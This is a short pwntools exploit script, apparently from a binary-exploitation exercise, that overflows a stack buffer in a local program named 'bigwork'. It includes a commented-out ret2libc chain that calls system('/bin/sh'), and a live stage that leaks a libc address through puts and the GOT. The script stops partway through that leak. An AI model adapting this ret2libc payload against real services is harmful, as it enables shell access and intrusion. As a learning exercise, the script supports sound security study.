# # ret2libc
# from pwn import *

# p = process('../src/bigwork')
# elf = ELF('../src/bigwork')
# # gef> b overflow
# # gef> b* 0x401326
# # gef> attach [pid]
# # gef> c

# p.sendline("1".encode())
# # gef> print system
# print('get sys_addr by "print system": ', end='')
# sys_addr = eval(input())
# # gef> print __libc_start_main
# print('get mainaddr by "print __libc_start_main": ', end='')
# mainaddr = eval(input())
# print(f'get binsh_addr by "find {mainaddr},+2200000,"/bin/sh"": ', end='')
# # gef> find 0xmainaddr,+2200000,"/bin/sh"
# binsh_addr = eval(input())

# pyload = ('a' * 0x30 + 'b' * 0x08).encode() + p64(sys_addr) + ('b' * 8).encode() + p64(binsh_addr)
# p.sendline(pyload)
# p.interactive()

# ret2libc
from pwn import *
from LibcSearcher import LibcSearcher

sh = process('../src/bigwork')
elf = ELF('../src/bigwork')

puts_plt = elf.plt['puts']
libc_start_main_got = elf.got['__libc_start_main']
main = elf.symbols['main']

sh.recv()

pyload = ('a' * 0x38).encode() + p64(puts_plt) + p64(main) + p64(libc_start_main_got)
sh.sendline("1".encode())
sh.sendlineafter("Which country do you live in?\n", pyload)
print(sh.recv())

# libc_start_main_addr = u32(sh.recv()[0: 8])